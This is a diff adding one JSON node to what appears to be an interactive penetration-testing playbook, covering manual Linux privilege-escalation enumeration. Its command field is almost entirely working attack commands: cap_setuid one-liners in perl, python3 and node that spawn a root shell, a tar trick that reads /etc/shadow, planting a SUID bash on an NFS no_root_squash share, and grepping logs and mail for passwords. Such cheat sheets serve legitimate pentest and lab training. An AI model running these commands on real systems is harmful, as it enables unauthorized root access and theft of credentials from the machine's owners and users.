@@ -1,0 +1,30 @@
+{
+  "id": "linux_manual_enum",
+  "phase": "LINUX",
+  "title": "Linux Manual Enum — Capabilities, NFS, Writable Files",
+  "body": "Techniques automated tools often miss — capabilities, NFS no_root_squash, writable files owned by root, recently modified files.",
+  "cmd": "# ── CAPABILITIES ─────────────────────────────────────\ngetcap -r / 2>/dev/null\n# cap_setuid+ep       = setuid to root\n# cap_dac_read_search = bypass read permission\n# cap_net_raw+ep      = raw packet capture\n\n# Exploit cap_setuid — perl\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n# Exploit cap_setuid — python3\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# Exploit cap_setuid — node\nnode -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:\"inherit\"})'\n\n# cap_dac_read_search — tar to read shadow\ntar -czf /tmp/s.tar.gz /etc/shadow && tar -xzf /tmp/s.tar.gz -C /tmp && cat /tmp/etc/shadow\n\n# ── NFS NO_ROOT_SQUASH ────────────────────────────────\ncat /etc/exports\nshowmount -e $ip\n# If no_root_squash present on a share:\n# On Kali — mount and plant SUID binary:\nsudo mount -t nfs $ip:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/rootbash\nchmod +s /mnt/nfs/rootbash\n# On target:\n/share/rootbash -p\n# Or mount on Kali and add root user to passwd\n\n# ── WRITABLE FILES OWNED BY ROOT ─────────────────────\n# Scripts run by root cron that you can write to\nfind / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v \"/dev/\" | grep -v run\nls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/hosts\n\n# ── RECENTLY MODIFIED FILES ───────────────────────────\nfind / -mmin -10 -type f 2>/dev/null | grep -v proc | grep -v sys\nfind /etc -mtime -1 2>/dev/null\nfind / -newer /etc/passwd -type f 2>/dev/null | grep -v proc | grep -v sys\n\n# ── LOG FILES — CREDENTIAL HUNTING ───────────────────\n# adm group or root readable\ncat /var/log/auth.log 2>/dev/null | grep -i \"pass|accept|fail\" | tail -30\ncat /var/log/apache2/access.log 2>/dev/null | grep -i \"pass\"\ncat /var/log/apache2/error.log 2>/dev/null | grep -i \"pass\"\ngrep -ri \"password\" /var/log/ 2>/dev/null | grep -v \"^Binary\" | head -20\n\n# ── /VAR/MAIL — CREDENTIAL HUNTING ───────────────────\nls -la /var/mail/ /var/spool/mail/ 2>/dev/null\ncat /var/mail/* 2>/dev/null\n\n# ── NOOWNER FILES ─────────────────────────────────────\nfind / -nouser -o -nogroup 2>/dev/null | grep -v proc | grep -v sys\n\n# ── UNMOUNTED DRIVES ──────────────────────────────────\nlsblk\ncat /etc/fstab\n# Partitions with no MOUNTPOINT = unmounted = may contain creds",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Capability found — GTFOBins",
+      "next": "suid_check"
+    },
+    {
+      "label": "NFS no_root_squash",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Writable cron script",
+      "next": "cron_check"
+    },
+    {
+      "label": "Found creds in logs/mail",
+      "next": "linux_password_hunt"
+    },
+    {
+      "label": "Back to main enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
